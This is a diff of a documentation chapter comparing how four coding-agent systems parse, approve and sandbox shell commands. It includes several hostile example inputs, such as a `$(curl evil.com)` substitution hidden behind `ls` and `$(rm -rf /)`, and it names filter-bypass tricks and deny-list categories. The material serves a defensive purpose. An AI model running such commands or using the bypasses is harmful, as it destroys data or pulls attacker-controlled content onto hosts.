@@ -1,34 +1,22 @@
 ---
-title: 07 · Shell Execution
+title: "07 · Shell execution: keep the blast radius outside the host"
 sidebar:
   order: 7
-description: execpolicy Starlark DSL vs Bash 23 security checks vs allowlist + safe-bin profile vs multi-backend terminal. Four routes for letting a model run shell
+description: Combine parsing, approval, and sandboxing for shell tools while keeping escape boundaries explicit.
+author: Rick
+last_verified: "2026-08-10"
+evidence: source-analysis
 ---
-
 import Verdict from '@components/Verdict.astro';
 import CompareTable from '@components/CompareTable.astro';
 import Diagram from '@components/Diagram.astro';
-import TradeOff from '@components/TradeOff.astro';
-import ScoreCard from '@components/ScoreCard.astro';
 import BuildRecipe from '@components/BuildRecipe.astro';
 import SourceTrail from '@components/SourceTrail.astro';
 import SourceBlock from '@components/SourceBlock.astro';
 
-## Shell connects the model to a real system
-
-<Verdict tldr="Shell is the agent's tightest coupling to the outside world and the loudest source of incidents. If the model can run arbitrary shell commands it can in principle do anything (delete files, modify the system, send mail, exfiltrate data), so every shell-safety effort in agent engineering eventually converges on four sub-questions. How do you decide whether a command is safe: keyword match, regex, AST parsing (AST = abstract syntax tree, the structured representation of a parsed command), or actually running a shell parser? When it is unsafe, what do you do: deny outright, request approval, or change the isolation environment? How do you defend against obfuscation, given the model may have learned base64 encoding, `$()` sub-shells, `sh -c` wrappers, and other tricks to slip past filters? And can the act of running itself be sandboxed, not by looking at argv (the actual array of command-line arguments handed to the OS) but by constraining the process's actual access to filesystem, network, and kernel? The four systems make four very different trade-offs. Codex treats the execution policy as a separately maintainable DSL: every «run / ask / deny» rule lives in Starlark (the Python-subset language Google built for Bazel: deterministic, side-effect-free, sandbox-friendly) inside a standalone `.codexpolicy` file. Each rule can embed `match` and `not_match` sample commands that the policy engine runs against the rule at startup, so a broken rule fails the build instead of silently mis-classifying commands at runtime. Each rule returns one of three Decisions (`Allow` / `Prompt` / `Forbidden`), with the strictest winning when multiple rules hit. This layer only decides «should this run»; the actual run is governed by an independent OS-level sandbox (Linux Landlock + seccomp, kernel features that drop filesystem and syscall access for a process; macOS seatbelt, the macOS sandbox profile language), defence in depth across two layers. Claude Code goes the opposite way: no separate DSL, all interception logic lives inside `BashTool`. It parses bash commands into an AST via tree-sitter (an incremental parser with a hand-written bash grammar), then walks each AST node through 23 numbered checkers, one per real-world shell-injection trick (`OBFUSCATED_FLAGS`, `SHELL_METACHARACTERS`, `IFS_INJECTION` (internal field separator injection), `PROC_ENVIRON_ACCESS` (reads `/proc/*/environ` to steal env vars), `UNICODE_WHITESPACE` (invisible Unicode whitespace smuggling arguments), all the way to `QUOTED_NEWLINE` #23 (newlines hidden inside quotes that re-enter the shell parser). After the 23 checks, commands enter the sandbox by default (macOS `sandbox-exec`, Linux bubblewrap, a userspace sandbox CLI built on Linux namespaces); opt-out requires an explicit allowlist. OpenClaw uses a 3D matrix plus a per-binary safe-bin profile. Three independent dimensions (`execSecurity` (`deny` / `allowlist` / `full`), `execAsk` (`off` / `on-miss` / `always`), `execHost` (`sandbox` / `gateway` / `node`)) combine into 27 modes for fine-grained ops tuning. In allowlist mode each permitted binary additionally has a safe-bin profile registering its allowed flags and positional-arg counts, and even GNU long-flag abbreviations (e.g. `--for` resolving to `--force`) are normalised before matching so they cannot bypass the deny-list. Hermes goes the opposite direction: don't filter shell, isolate the environment. Instead of doing complex AST parsing at the command layer, the entire terminal is routed into one of 7 backends via the `TERMINAL_ENV` environment variable (`local` with no isolation, `docker`, `modal` cloud sandbox, `ssh`, `singularity` HPC container, `daytona` dev-as-a-service, `managed-modal`). At the command layer Hermes only enforces a `workdir` char allowlist plus delegates dangerous-command detection to a separate `tirith` subprocess (Tirith, Hermes's standalone security scanner for shell commands). The logic is «if it blows up inside the container, the host is unaffected». Cost curves diverge: Codex has the highest maintenance overhead but rules are git-versionable and reviewable; Claude Code has the highest default safety but parsing overhead; OpenClaw has the richest config surface but users must understand the matrix; Hermes filters least at the command layer but the container fallback is the steadiest." />
-
-## Four gates before a command runs
-
-<details>
-<summary>Before reading (optional)</summary>
-
-- **Loudest incident source**: arbitrary shell means the model can in principle do anything; the problem splits into deciding safety, handling unsafe commands, defeating obfuscation, and sandboxing execution.
-- **Four routes**: Codex keeps `allow / ask / deny` rules in a self-testing Starlark `.codexpolicy` file returning `Allow` / `Prompt` / `Forbidden`; Claude Code walks a tree-sitter AST through 23 numbered checkers inside `BashTool`; OpenClaw crosses `execSecurity` × `execAsk` × `execHost` into 27 modes plus safe-bin profiles; Hermes skips command filtering and routes the terminal into 7 backends via `TERMINAL_ENV`.
-- **Policy is a rule body, not code**: rules evolve constantly; a git-versionable DSL with `match` / `not_match` self-tests determines whether a broken rule fails the build or silently mis-classifies at runtime.
-- **Never rely on argv alone**: base64, `$()` sub-shells, and `sh -c` wrappers slip past filters; an OS-level sandbox (Landlock + seccomp, seatbelt, bubblewrap, containers) must back the command layer up.
-
-</details>
+## Who can stop a command before it runs
+<Verdict tldr="Shell is where an agent touches the host. This chapter asks one question: after parsing, approval, and sandboxing, how much blast radius remains? The four implementations place control in rules, human approval, or the execution environment; the answer depends on the threat model." />
+## Draw the command boundary first
 
 <Diagram
   src="/diagrams/07-shell-execution-base.svg"
@@ -50,7 +38,7 @@ How the four systems land at the four decision points (parse / decide / approve 
   dimensionLabel="Dimension"
 />
 
-## How four systems execute shell commands
+## Compare only implementations that change blast radius
 
 ### Codex · Execution policy as a Starlark DSL in a standalone file: rules are git-versionable, reviewable, self-testable
 
@@ -126,13 +114,13 @@ On Linux the implementation combines Landlock + seccomp (Landlock restricts file
 
 The relationship between the two layers: execpolicy gates command literal (what argv looks like), sandbox gates syscalls (what the process actually wants to do); even if execpolicy lets through a dangerous command, sandbox can still block the dangerous operations the command attempts.
 
-This two-layer defense-in-depth is the heart of Codex's security design; any single-layer hole has the other layer as fallback.
+This two-layer arrangement is part of Codex's security design; the second layer can provide fallback for some command-policy misses, but actual coverage depends on sandbox and host configuration.
 
 ### Claude Code · 23 ID-tagged security checks inside BashTool + tree-sitter dual parse
 
 Claude Code makes a completely opposite judgement to Codex. Instead of a standalone DSL, it stuffs all interception logic into a single BashTool tool.
 
-The reasoning: bash is an extremely complex language semantically (here-docs, command substitution, process substitution, various redirection, brace expansion, parameter expansion, etc.); simple prefix matching cannot accurately judge "what does this bash command actually do"; to really understand bash semantics you must walk an AST, and AST-walking complexity is already an order of magnitude beyond rule-matching languages, so the choice is to integrate AST parsing + all specific checkers into BashTool.
+The reasoning: bash has complex constructs (here-docs, command substitution, process substitution, redirection, brace and parameter expansion). Prefix matching cannot tell what the command will do; an AST parser gives richer structure at the cost of parser and rule maintenance. Benchmark that cost on the target command mix rather than assuming an order-of-magnitude gap.
 
 Each checker gets a numeric ID (so logs only record IDs, not raw commands, avoiding PII leaks). The opening of bashSecurity.ts is the 23-class numbered risk list:
 
@@ -207,9 +195,9 @@ const ZSH_DANGEROUS_COMMANDS = new Set([
 
 </SourceBlock>
 
-This kind of "zsh module loading" defense is something almost only people who have written real-world zsh exploitation would think of.
+This kind of "zsh module loading" defense is easy to miss without a zsh-specific threat model.
 
-Most bash safety solutions completely ignore the unique zsh attack surface, but Claude Code, being cross-platform developer-facing, must consider how zsh users actually execute commands. `emulate` is zsh's eval equivalent (executes a string as a command) and is also rejected.
+Many shell-security implementations do not cover the same zsh module surface; this snapshot explicitly accounts for zsh execution on supported platforms. `emulate` is zsh's eval equivalent (executes a string as a command) and is also rejected.
 
 The third layer is the sandbox. After passing the 23 checks + zsh dangerous commands, shouldUseSandbox() defaults to true, putting the command into the sandbox (macOS uses sandbox-exec, Linux uses bubblewrap); the only way to skip the sandbox is if the user explicitly added the command to `sandbox.excludedCommands` in settings, or the command call explicitly carried `dangerouslyDisableSandbox: true`:
 
@@ -236,7 +224,7 @@ export function shouldUseSandbox(input: Partial<SandboxInput>): boolean {
 
 There's a phenomenally important comment in this code (near the top of shouldUseSandbox.ts) that reads "excludedCommands is a user convenience feature, not a security boundary", telling every reviewer and future developer "this excludedCommands is not for attackers to bypass the sandbox; it's for users in scenarios where they know a particular command is safe and can skip the sandbox.
 
-The real security boundary is sandbox + permission prompt; sandbox always defaults on unless the user proactively adds an allowlist, permission prompt always asks unless the user proactively approves always." This kind of explicit "distinguishing convenience features from security boundaries" engineering discipline is clearest here; this one comment line makes any attempt to "use excludedCommands as a shortcut around safety checks" instantly recognised as misuse.
+In this source path and configuration, sandbox plus the permission prompt form two boundaries; whether they are enabled and when they ask still depends on permission mode and user settings. `excludedCommands` is a convenience option, not a security boundary. The useful lesson is to review the two layers separately.
 
 ### OpenClaw · Two-dimension matrix + per-binary safe-bin profile + GNU long-flag abbreviation resolution
 
@@ -268,7 +256,7 @@ ExecSecurity is "safety level": deny outright bans all shell execution (suitable
 
 ExecAsk is "ask the user or not": off never asks; on-miss asks only when allowlist misses (letting the user decide whether to temp-allow); always asks for every command (most conservative).
 
-The theoretical product is 3×3×3 = 27 combinations; the meaningful ones are about 12; ops pick a combination per scenario (e.g. sandbox + allowlist + on-miss for enterprise CI; gateway + full + off for trusted internal deployment).
+The theoretical product is 3×3×3 = 27 combinations. Which ones are useful depends on the deployment; for example, sandbox + allowlist + on-miss can suit CI that needs a human fallback, while gateway + full + off belongs only in an explicitly trusted internal environment.
 
 There is one particularly detailed handling in allowlist mode: shell wrappers (`sh -c`, `bash -c`, Windows `cmd.exe /c`) are blocked outright. Because these wrappers are the most common allowlist-bypass trick:
 
@@ -334,7 +322,7 @@ export type SafeBinProfile = {
 
 The fields are: allowedValueFlags is "flags this binary is allowed to use" (e.g. git's profile may allow `--branch`, `--no-pager` but not `--git-dir`, preventing attackers from rewriting git internals); deniedFlags is "flags this binary is explicitly disallowed from using" (e.g. rm's profile must deny `--force` and `--recursive`); minPositional and maxPositional bound positional args (e.g. ls's profile might require minPositional=0 maxPositional=10, preventing someone from sending 100 positionals to overflow the process stack); knownLongFlagsSet and longFlagPrefixMap are GNU long flag metadata, specifically for handling GNU-style long flag abbreviations.
 
-GNU long flag abbreviation resolution is OpenClaw's unique capability among the 4 open-source agents. GNU tools support long flag abbreviations: as long as the abbreviation uniquely matches a complete flag, it takes effect.
+OpenClaw explicitly resolves GNU long-flag abbreviations in the pinned path. GNU tools can accept a unique abbreviation for a complete flag.
 
 For example `git --version` equals `git --vers` equals `git --ver` (as long as `--ve` is unique to `--version`); `rm --force` can be abbreviated to `rm --for` or even `rm --fo` (as long as `--f` is unique to `--force`).
 
@@ -342,7 +330,7 @@ If the attacker knows deniedFlags contains `--force`, the model could be made to
 
 OpenClaw resolves any long flag abbreviation back to the complete flag via longFlagPrefixMap before matching allowedValueFlags / deniedFlags, so `--for` and `--force` are the same, and abbreviations can't bypass.
 
-This level of anti-obfuscation detail is unique to OpenClaw among the 4; the other three don't specially handle GNU long flag abbreviations.
+The corresponding paths inspected in the other three pinned snapshots do not show equivalent GNU-abbreviation handling. That scoped comparison does not rule out defenses elsewhere or in later versions.
 
 Approval is asynchronous. When a command needs ask (hitting on-miss or always policy), exec-approval-manager doesn't block in place; instead it pushes the approval request via a JSONL socket to UI / Discord / CLI / gateway, whichever channel the user is active on (decided by where the user is currently engaging the agent).
 
@@ -350,9 +338,9 @@ The user confirms or denies in their preferred entry. This "decouple approval en
 
 ### Hermes · Don't filter shell, filter the execution environment: dump the command into one of 7 backends to isolate
 
-Hermes picks a path completely opposite to the previous three. Its judgement: doing complex AST parsing + 23 checks + safe-bin profiles at the command layer has unsustainable maintenance overhead (every new trick discovered requires a new rule; rules may conflict), false positives and negatives can never be reduced to 0, and it's essentially an endless cat-and-mouse game with attackers; better to flip the thinking.
+Hermes makes a different trade-off from the other three. Its judgment is that complex AST parsing, many checks, and safe-bin profiles can impose high maintenance cost: new tricks require new rules and rules may conflict. Detection errors cannot be expected to reach zero, so it moves more protection into the execution environment.
 
-Accept "command layer can't catch all attacks" and put every command into a strong isolation environment, letting the container / sandbox at the syscall layer handle the fallback, so even if the command layer is bypassed, the host is unaffected.
+The approach is to accept that command-layer checks are incomplete and use an isolation environment as another boundary. A container or sandbox can reduce host impact only when its image, mounts, capabilities, network, and escape paths are configured and tested; it does not make the host unaffected by definition.
 
 Specifically, Hermes offers 7 backend options, chosen via the TERMINAL_ENV environment variable:
 
@@ -382,7 +370,7 @@ Features:
 
 </SourceBlock>
 
-Expanding the 7 backends: local is "run directly on the host", zero isolation, fastest, suitable for personal dev boxes with full agent trust; docker is "local Docker container", moderate isolation, low latency, suitable for most cases; modal is "Modal cloud sandbox", strong isolation but goes over the network, suitable for SaaS agents; singularity is "HPC container", designed for high-performance computing environments; daytona is "dev-as-a-service container", suitable for ephemeral dev environments; ssh is "remote machine", suitable for running commands on a dedicated machine; managed-modal is Modal's managed mode (directly hitting Modal's gateway, no need for users to manage their own Modal API key).
+Expanding the 7 backends: local is "run directly on the host", with no isolation; docker is a local container; modal is a cloud sandbox with network latency; singularity targets HPC environments; daytona provides an ephemeral dev environment; ssh runs on a dedicated remote machine; managed-modal calls Modal's managed gateway. The right default depends on trust, latency, and operations constraints.
 
 Each backend has its own image / CPU / memory / disk / persistence config (see chapter 13 on sandbox), so users can fine-tune per scenario.
 
@@ -393,7 +381,6 @@ Although main isolation depends on the environment, Hermes still does the minimu
 ```python
 # Allowlist: characters that can legitimately appear in directory paths.
 _WORKDIR_SAFE_RE = re.compile(r'^[A-Za-z0-9/\\:_\-.~ +@=,]+$')
-
 
 def _validate_workdir(workdir: str) -> str | None:
     """Reject workdir values that don't look like a filesystem path.
@@ -416,11 +403,11 @@ def _validate_workdir(workdir: str) -> str | None:
 
 </SourceBlock>
 
-Several details in this code stand out. `_WORKDIR_SAFE_RE` uses allowlist (explicitly listing allowed characters) rather than deny-list (explicitly listing forbidden characters); the author writes in the docstring "Uses an allowlist of safe characters rather than a deny-list, so novel shell metacharacters can't slip through." Deny-list is "blacklist" thinking (list known bad chars), and any new metacharacter slips through; allowlist is "whitelist" thinking (only allow known safe chars), and adding new chars is slower but miss probability is near zero.
+Several details in this code stand out. `_WORKDIR_SAFE_RE` uses an allowlist (explicitly listing allowed characters) rather than a deny-list (explicitly listing forbidden characters); the author writes in the docstring "Uses an allowlist of safe characters rather than a deny-list, so novel shell metacharacters can't slip through." A deny-list can miss a new metacharacter; an allowlist reduces that class of bypass but is not a zero-miss guarantee.
 
 The "document why allowlist not deny-list" habit makes future maintainers avoid accidentally flipping to deny-list.
 
-The allowed character set `A-Za-z0-9/\\:_\-.~ +@=,` covers all the legal characters a filesystem path needs (alphanumeric, path separators, colon, underscore, hyphen, dot, tilde, space, plus, @, equals, comma), enough for real paths, but excludes all shell metacharacters (`$` `` ` `` `|` `&` `;` `(` `)` `{` `}` `<` `>` `'` `"` `\` etc.).
+The allowed character set `A-Za-z0-9/\\:_\-.~ +@=,` covers common Unix and Windows path characters. It does not cover every legal path, and it does not check `..`, symlinks, or mount boundaries; it only reduces one class of shell-metacharacter input.
 
 If workdir contains any non-allowlist character, the function rescans char by char to find the specific offending character and gives the user a precise error message (not "workdir invalid" but the concrete "Blocked: workdir contains disallowed character '$'").
 
@@ -428,23 +415,23 @@ If workdir contains any non-allowlist character, the function rescans char by ch
 
 IM platforms (see chapter 14 on multi-channel entry).
 
-Why does Hermes do so little at the command layer? Because its core thesis is "real isolation is not at the command layer but at the execution layer." If you're worried about a command's safety, switch TERMINAL_ENV to docker / modal / managed-modal so the command runs in a container; if it blows up it doesn't affect the host; doing too much AST parsing + rule matching at the command layer is poor ROI.
+Why does Hermes do so little at the command layer? It moves part of the protection to the execution environment. Docker, Modal, or managed-modal can reduce blast radius, but the boundary depends on image, mounts, capabilities, network, and host configuration; a container is not a guarantee of host safety. Heavy AST parsing also carries maintenance cost.
 
 This moves the centre of protection from the shell command layer to the execution environment layer, the biggest philosophical gap between Hermes and the other three.
 
-## What shell execution already agrees on
+## Fix parsing, approval, and isolation boundaries first
 
-Despite huge differences in engineering depth (Codex's standalone DSL vs Hermes's minimal command-layer filtering), there are three consensus points where all four agree on what shell execution requires.
+The four implementations cover different shell boundaries. The following are review questions, not guarantees implemented equally by all four.
 
-**The first is that bash/zsh cannot be gated by regex alone.** This is a hard-earned consensus battered by real-world combat: bash/zsh syntax includes here-docs (`<<EOF ... EOF`), command substitution (`$(...)` and `` `...` ``), process substitution (`<(...)`), various redirections, brace expansion (`{a,b,c}`), parameter expansion (`${var:-default}`), and other complex features; simple regex matching `rm` cannot recognise `(rm)` or `r"m"` or `\rm` variations; simple regex banning `&&` cannot detect a newline + second command inside a here-doc. So Codex uses shlex tokenisation + Starlark rules, Claude Code uses tree-sitter (a real bash AST parser), OpenClaw has dedicated obfuscation-detect, Hermes restricts workdir to char allowlist; no system tries to solve it with a single regex line; everyone has at least lexer-level parsing.
+**First, one regex is not a shell parser.** Bash and zsh include here-docs, command substitution, redirection, and parameter expansion. Codex tokenises selected command shapes, Claude Code uses a bash parser on relevant paths, and OpenClaw adds command and flag checks. Hermes primarily validates workdir characters and delegates dangerous-command checks; that is not lexer-level parsing of wrapper contents.
 
-**The second is that command and environment are two different concerns.** All four systems split "should this command run" and "where does it run, what can it access" into two independent gates. Codex's execpolicy + sandbox_mode (command literal vs syscalls); Claude Code's 23 checks + SandboxManager (AST content vs process isolation); OpenClaw's ExecSecurity + ExecHost (command policy vs execution host); Hermes's workdir/tirith + TERMINAL_ENV (command literal vs backend isolation). This "two independent judgement" design is basic engineering reason: any single-layer hole has the other layer as fallback; you don't find designs that mix them in the source.
+**The second is that command and environment are different concerns.** All four samples expose both kinds of control, but coverage and defaults depend on the host and deployment. Command policy constrains argv or shell shape; the environment constrains process access. Do not assume that a miss in one layer will be caught by the next without an adversarial test.
 
-**The third is that approval is async, not blocking the agent main loop.** When a command needs to ask the user, all four use some async mechanism to push the approval request out and continue waiting for callback, rather than blocking the current thread waiting for user input. Codex uses TUI (an interactive prompt in the CLI terminal); Claude Code uses permission mode (IDE dialog); OpenClaw uses JSONL socket (push to any active channel); Hermes uses approval_callback (callback internally decides which IM platform). This async design lets the agent continue doing other things while waiting for approval (e.g. reading files, looking up docs), so users don't feel stuck.
+**The third is that approval requests can travel asynchronously.** Codex, Claude Code, OpenClaw, and Hermes expose different channels. An async callback means the sender's thread is not occupied; the pending tool action usually still waits for a decision. It does not imply that the agent can safely read files or run other tools in parallel.
 
-**The fourth is that shell wrappers (sh -c / bash -c / cmd /c) are high risk.** Such wrappers hide the real command inside the `-c` argument string, defeating argv-level checks (which only see argv[0]). All four specially handle this: OpenClaw outright denies wrappers in allowlist mode; the other three parse open the inner string and re-walk it as a new command.
+**The fourth is that shell wrappers (sh -c / bash -c / cmd /c) need explicit handling.** They hide the real command in a `-c` string, which argv-level checks may miss. OpenClaw denies wrappers in allowlist mode; Codex raises related commands to `Prompt`. Other parsing and approval paths differ by source, so do not describe them all as recursive parsers.
 
-## Trade parsing against policy and isolation
+## Put convenience beside blast radius
 
 <Diagram
   src="/diagrams/07-tradeoff.svg"
@@ -454,44 +441,40 @@ Despite huge differences in engineering depth (Codex's standalone DSL vs Hermes'
 
 "How strict to make shell protection" reduces to "in what scenario does your agent run". Reading the trade-offs from scenario, the four choices each map to one typical deployment.
 
-**If you are a personal developer using an agent for everyday coding and your worst pain is "every command interrupted by approval popups"**, then Hermes's `TERMINAL_ENV=docker` is the most comfortable: everyday ls / grep / cat / git pass through without interruption, and risky commands run in a container so a blast doesn't touch the host; the trade-off is weak fine-grained command audit (to see what ran you have to check container logs).
+**If you are a personal developer using an agent for everyday coding and want fewer approval popups**, Hermes's `TERMINAL_ENV=docker` is one option to evaluate. Whether a risky command can affect the host depends on image, mounts, sockets, capabilities, network, and runtime configuration; container logs also change the audit path.
 
-**If you are deploying agents to employees in an enterprise and compliance requires every command to be auditable**, then OpenClaw's `security=allowlist` + per-binary safe-bin profile is essential: every flag of every command has binary-level bounds, GNU long-flag abbreviations are resolved and detected, anti-obfuscation is strongest; the trade-off is safe-bin profile maintenance cost (every new tool needs a profile written), and employees' day-to-day experience is most interrupted (every command outside the allowlist needs approval).
+**If you are deploying agents to employees in an enterprise and compliance requires every command to be auditable**, evaluate OpenClaw's `security=allowlist` plus per-binary safe-bin profiles. It puts flag bounds and abbreviation handling at the command layer, at the cost of profile maintenance and more approval prompts. Test whether it covers your shell, tools, and audit requirements.
 
-**If you are wiring agents into CI / automation and need rules to be git-versioned**, then Codex's `.codexpolicy` Starlark DSL is most appropriate: rules can live in a git repo and be reviewed, diffed, and CI-validated (match / not_match self-tests fail-fast), and the security team can iterate independently of agent code; the trade-off is that Starlark has a learning curve for ops (not everyone is familiar with Bazel-style scripting), and someone needs to maintain the rule set.
+**If you are wiring agents into CI / automation and need rules to be git-versioned**, Codex's `.codexpolicy` Starlark DSL is a candidate to evaluate: rules can live in a git repo and be reviewed, diffed, and CI-validated (match / not_match self-tests fail-fast). The trade-off is Starlark's learning curve for ops and the need to maintain the rule set.
 
-**If you are building a cross-IDE / cross-platform developer tool with a large diverse user base**, then Claude Code's 23 checks + tree-sitter dual parse + sandbox-by-default + permission mode gives the highest default safety: every known bash/zsh injection trick has a dedicated checker, and a new user gets reasonable safety without any configuration; the trade-off is that every command pays an extra tree-sitter + 23-check round of overhead (5-20ms more latency for lightweight commands), and the maintenance burden of the 23 checks falls primarily on the Anthropic team (community contribution barrier is high).
+**If you are building a cross-IDE / cross-platform developer tool with a large diverse user base**, study Claude Code's 23 checks, tree-sitter dual parse, sandbox-by-default, and permission mode. They provide substantial default constraints, but the source cannot establish coverage of every injection variant; measure latency and maintenance cost on the target platforms.
 
 Pick by scenario:
 
 - **Solo dev machine, hate interruptions:** Hermes with `TERMINAL_ENV=docker` + dangerous-command deny. `grep`/`ls` runs free; `rm -rf` hits approval.
-- **Enterprise, every command must be audited:** OpenClaw `security=allowlist` + per-binary safe-bin profile. Binary-level flag bounds and the strongest anti-obfuscation.
+- **Enterprise, every command must be audited:** evaluate OpenClaw `security=allowlist` + per-binary safe-bin profiles, then test coverage and approval load.
 - **Plugged into CI / automation:** Codex execpolicy. The `.codexpolicy` file is reviewable, diffable, gittable. Rule changes have audit history.
-- **Cross-IDE, cross-platform, mixed users:** Claude Code's 23 checks + sandbox-by-default + permission mode. Highest default safety at the cost of more parsing per command.
+- **Cross-IDE, cross-platform, mixed users:** Claude Code's 23 checks + sandbox-by-default + permission mode, with latency and coverage measured on your platforms.
 
-## My take: command execution must explain itself
+## Let the threat model set isolation strength
 
-<ScoreCard
-  rows={[
-    { system: 'Codex', value: '★★★★★', reason: 'Starlark execpolicy DSL + self-testing match/not_match + UI-visible justification + sandbox as second layer. Rules version like code', risk: 'Rules require human authoring; the community rule set is still thin; ops people need to learn Starlark' },
-    { system: 'Claude Code', value: '★★★★★', reason: '23 ID-tagged checks + dual-parser (tree-sitter + shell-quote) + zsh-module deny + sandbox-by-default + clear separation of convenience vs boundary', risk: 'Parse cost is high; excludedCommands looks like a boundary but is not; sandbox behavior changes go through SandboxManager' },
-    { system: 'OpenClaw', value: '★★★★★', reason: 'security × ask matrix + safe-bin profile per binary + GNU long-flag abbrev resolution + shell-wrapper deny under allowlist', risk: 'Safe-bin profile maintenance cost; first-time users face 9 mode combos' },
-    { system: 'Hermes', value: '★★★★', reason: 'TERMINAL_ENV covers nearly every isolation need; allowlist-based workdir; approval callback bridges IM platforms', risk: 'Weak command-layer filtering, relies on container/sandbox to catch the fallout; managing 7 backends costs ops time; local mode has no default sandbox' },
-  ]}
-  caption="Scoring axes: default safety + engineering maintainability + approval UX + cross-scenario fit"
-  headers={['System', 'Score', 'Strengths', 'Risks']}
-/>
+| Threat model or constraint | Route to borrow | Cost or boundary |
+| --- | --- | --- |
+| Rules must be versioned and reviewed in CI | Codex execpolicy plus sandbox | Policy authors must maintain the DSL |
+| Untrusted commands need broad parsing and default isolation | Claude Code AST checks plus sandbox | More parsing and platform-specific behavior |
+| Operators need a tunable approval matrix | OpenClaw execSecurity, execAsk, and execHost | Configuration is easy to misread |
+| Host impact must stay outside the process | Hermes isolated terminal backends | Command-layer filtering is comparatively thin |
 
-## Build the smallest safe executor
+## Start with a deny-by-default executor
 
-Below is the recipe distilled from the four systems for writing your own shell execution + command review pipeline. Start with an allowlist, then add production-grade features, finally avoid four common dead ends.
+When building shell execution and command review, define deny-by-default behavior, approvals, and working-directory boundaries first. Add parsers, policy DSLs, and isolated backends after those controls are testable.
 
 <BuildRecipe
   title="Build recipe"
   minimal={[
-    'Start with an allowlist: maintain a safe-cmd.txt, shlex-tokenize before tool call + compare head token (the command name). Allowlist is far safer than denylist (denylist always behind new attack patterns); first add common safe commands like ls / cat / grep / git status',
-    'Route everything non-allowlisted to an approval prompt, don\'t blanket-deny. Direct deny is too rigid (legitimate user needs blocked); letting users participate in decisions (see what the command is, decide whether to allow) is the best coding agent experience',
-    'Validate workdir with a char allowlist regex (borrow from Hermes\' _WORKDIR_SAFE_RE): preventing path traversal like cd ../../etc; only allow letters / digits / `_-./` and other safe characters; reject on weird character',
+    'Start with an allowlist: use shlex tokenisation and a head-token check as a teaching entry point, not a complete security boundary. Parse pipelines, redirections, substitutions, and wrappers before execution, and test the policy',
+    'Route non-allowlisted commands to an approval prompt when the threat model permits it; do not blanket-deny without checking legitimate workflows. Showing the command and recording the decision can reduce interruption while preserving a review point',
+    'Validate workdir characters, then enforce realpath containment inside the workspace. A character allowlist alone does not stop `../`, symlinks, or mounts from escaping the intended root',
     'Shell wrappers (sh -c / bash -c / cmd /c) always go to approval. These wrappers let the model construct arbitrary commands (bypassing allowlist checks); must have human approval to confirm intent',
   ]}
   advanced={[
@@ -499,13 +482,13 @@ Below is the recipe distilled from the four systems for writing your own shell e
     'Each rule carries match / not_match self-tests, loader runs them all on load: broken rule fails fast on startup (fail fast), avoiding "ran a week before discovering rule was wrong"',
     'Parse shell with tree-sitter (borrow from Claude Code): recognizes here-doc, command substitution, redirection and other complex structures; regex parsing often errs on these (severe under-matching / over-matching)',
     'Add per-binary flag allow/deny (borrow from OpenClaw\'s safe-bin profile): same command different flags vary wildly in risk (git status safe / git push --force dangerous); flag-level granularity allows precise control',
-    'Swap the execution backend for risky work (borrow from Hermes): docker / firecracker / cloud sandbox as backstop; risky commands (like build / test running user code) run in isolated environments, escape just contaminates container not host',
+    'Swap the execution backend for risky work (borrow from Hermes): docker / firecracker / cloud sandbox can reduce blast radius only when image, mounts, capabilities, network, and escape paths are audited',
     'Number every sec check (borrow from Claude Code\'s 23 ID-tagged checks): log IDs instead of raw commands; this enables tracing (which check intercepted it) without leaking command details to log collection systems',
   ]}
   avoid={[
-    'Don\'t rely on deny-lists alone: every new trick forces a new rule, attacker keeps the initiative; attackers always invent new bypasses (curl | bash variants / base64-encoded commands / shell string concatenation / etc)',
-    'Don\'t let sandbox be the only line of defense: bubblewrap / seatbelt / docker all have escape CVE history; need defense in depth (multi-layer defense), command-level review + sandbox + audit log all required',
-    'Don\'t instruct the model "never rm -rf" in the prompt: model obedience is not 100% (especially after jailbreak); any safety design relying on model self-discipline is unreliable; safety must be at the tool layer',
+    'Don\'t rely on deny-lists alone: new shell tricks can require new rules and leave gaps; pair known-pattern checks with parsing, isolation, and audit evidence',
+    'Don\'t let sandbox be the only line of defense: its protection depends on configuration and platform history; combine command review, isolation, and audit according to the threat model',
+    'Don\'t instruct the model "never rm -rf" in the prompt: following a prompt is not a safety guarantee, especially after prompt injection or jailbreak; put enforcement at the tool and execution layers',
     'Don\'t confuse convenience features (excludedCommands) with security boundaries (Claude Code\'s in-source warning explicitly states this): these are "UX features" (avoiding annoying approval popups), not security boundaries (attackers can craft commands to bypass)',
   ]}
 />
@@ -518,11 +501,11 @@ Below is the recipe distilled from the four systems for writing your own shell e
   caption="Same command, four non-overlapping intercept positions: Codex at DSL decision, Claude Code at bash parsing, OpenClaw at the matrix + per-binary profile, Hermes at the execution environment."
 />
 
-The four systems intercept in non-overlapping places. Codex externalizes decisions into a DSL, Claude Code enumerates attack shapes in the parser, OpenClaw uses a 2D matrix plus binary-level constraints, Hermes swaps out the execution environment.
+The four systems put their primary checks in different places. Codex externalizes decisions into a DSL, Claude Code handles attack shapes in the parser, OpenClaw uses a 2D matrix plus binary-level constraints, and Hermes puts more weight on the execution environment.
 
 Building your own? Pick two or three layers and combine them.
 
-## Follow execution policy through source
+## Source paths for command interception
 
 <SourceTrail
   title="Source map & further reading"
@@ -560,7 +543,7 @@ Building your own? Pick two or three layers and combine them.
 <details>
 <summary>**Q1 · Concept**: Why can't a single regex gate shell commands? What does each system use instead?</summary>
 
-The root issue: **shell syntax is not a regular language**. Constructs like `echo "hello $(rm -rf /)"` require a context-free grammar: quote nesting (`"'$(...)'"`), escapes, variable expansion, here-docs all exceed regex capacity.
+The root issue is that a single regex cannot reliably express shell nesting and interpreter semantics. Constructs like `echo "hello $(rm -rf /)"`, along with quote nesting, escapes, variable expansion, and here-docs, need a shell-aware parser or the actual shell's parsing result; one regex cannot cover these combinations.
 
 Brute-forcing regex either misses a variant (an attacker always finds an unconsidered shape) or false-positives on legitimate input (rejects a `$`-containing jq expression as a command substitution).
 
@@ -609,12 +592,12 @@ This is one of the most precise lines in the Claude Code codebase. It explicitly
 
 Scenario: a user finds sandbox startup slow for `ls`, so they add `sandbox.excludedCommands: ["ls", "cat", "head"]` in settings. Those commands now skip the sandbox.
 
-Risk: an attacker forms `ls --color=auto -la $(curl evil.com)`; the model identifies "head token is ls" and lets it through, bypassing the sandbox.
+Risk: a command such as `ls --color=auto -la $(curl evil.com)` can carry shell substitution even when the first token is `ls`; a convenience exclusion is not a security boundary.
 
 The correct framing:
 
 - **excludedCommands** = convenience. **Purpose**: cut sandbox startup overhead on ls/cat/grep. **Premise**: user has already vetted the danger of these argvs. **Does NOT promise**: protection from attacks using these commands.
